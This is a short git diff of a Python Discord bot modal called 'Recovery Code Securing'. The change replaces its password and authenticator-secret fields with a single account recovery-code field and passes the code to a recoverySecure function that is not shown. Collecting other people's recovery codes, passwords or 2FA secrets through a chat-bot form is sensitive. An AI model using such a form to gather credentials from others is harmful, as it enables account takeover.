@@ -7,17 +7,16 @@ class recoveryModal(ui.Modal):
     def __init__(self):
         super().__init__(title="Recovery Code Securing")
         self.add_item(ui.InputText(label="Email", placeholder="example@gmail.com", required=True))
-        self.add_item(ui.InputText(label="Password", placeholder="1234", required = True))
-        self.add_item(ui.InputText(label="Authenticator Secret", placeholder="XXXXXXXXXXXXXXXX", required = True))
+        self.add_item(ui.InputText(label="Recovery Code", placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX", required = True))
 
     async def callback(self, interaction: discord.Interaction):
         email = self.children[0].value
-        password = self.children[1].value
-        auth_secret = self.children[2].value
-
+        recovery_code = self.children[1].value
+        
         await interaction.response.defer(ephemeral=True)
 
-        account = await recoverySecure(email, password, auth_secret)
+        account = await recoverySecure(email, "rcvcode", {"recovery_code": recovery_code})
+
         if account == "invalid":
             await interaction.followup.send(
                 embed = discord.Embed(
@@ -40,6 +39,8 @@ class recoveryModal(ui.Modal):
             )
             return
 
-        pass
+        return account
+
+    
 
     
